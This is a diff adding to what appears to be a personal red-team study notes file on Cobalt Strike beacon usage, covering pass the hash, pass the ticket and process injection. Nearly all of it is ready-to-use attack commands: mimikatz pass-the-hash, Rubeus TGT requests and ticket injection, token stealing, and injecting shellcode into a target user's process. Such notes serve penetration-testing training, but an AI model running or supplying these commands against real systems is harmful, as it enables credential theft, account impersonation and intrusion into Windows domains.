@@ -20,3 +20,42 @@ token impersonation:
         beacon> token-store show
         beacon> token-store use <id>
         beacon> token-store remove <id>
+
+pass the hash:
+    technique where an adversary leverages an NTLM hash
+    if we have a user's NTLM hash, the beacon has built in functionality to impersonate the user's token:
+        beacon> pth <domain>\<user> <NTLM>
+    if we have a user's NTML hash and want to manually impersonate:
+        beacon> mimikatz sekurlsa::pth /user:<user> /domain:<domain> /ntlm:<NTLM> /run:%COMSPEC%
+            NOTE: this will return an associated PID
+        beacon> steal_token <pid>
+
+pass the ticket:
+    technique where an adversary leverages kerberos tickets
+    if we have a user's NTLM hash or AES key, we can request a TGT:
+        beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:<user> /domain:<domain> /aes256:<aes_key> /nowrap
+    once we have a TGT, we can inject it:
+        we must have the ticket in a .kirbi file
+            if we have a base64 encoded ticket via rubeus we can write to disk as follows:
+                $ticket = "doIFo[...snip...]kNPTQ=="
+                [IO.File]::WriteAllBytes("C:\Users\Attacker\Desktop\rsteel.kirbi", [Convert]::FromBase64String($ticket))
+        then we want to create a new logon session so we don't impact our active session:
+            to create a new logon session:
+                beacon> make_token <domain>\<user> FakePass
+            validate session was create and we have no active tickets:
+                beacon> run klist
+            now inject the ticket into the new session:
+                beacon> kerberos_ticket_use C:\Users\Attacker\Desktop\rsteel.kirbi
+        if we want to purge the tickets:
+            beacon> kerberos_ticket_purge
+    passing the ticket via rubeus:
+        we can spawn a hidden process in a new logon session:
+            beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\notepad.exe /username:<user> /domain:<domain> /password:FakePass
+        using the new logon session id and process id, we can utilize the ticket:
+            beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe ptt /luid:<luid> /ticket:<base64_encoded_ticket>
+            beacon> steal_token <pid>
+
+process injection:
+    we can inject shellcode directly into a process being run by the target user:
+        beacon> inject <pid> <arch> <listener>
+        e.g.    inject 5248 x64 http
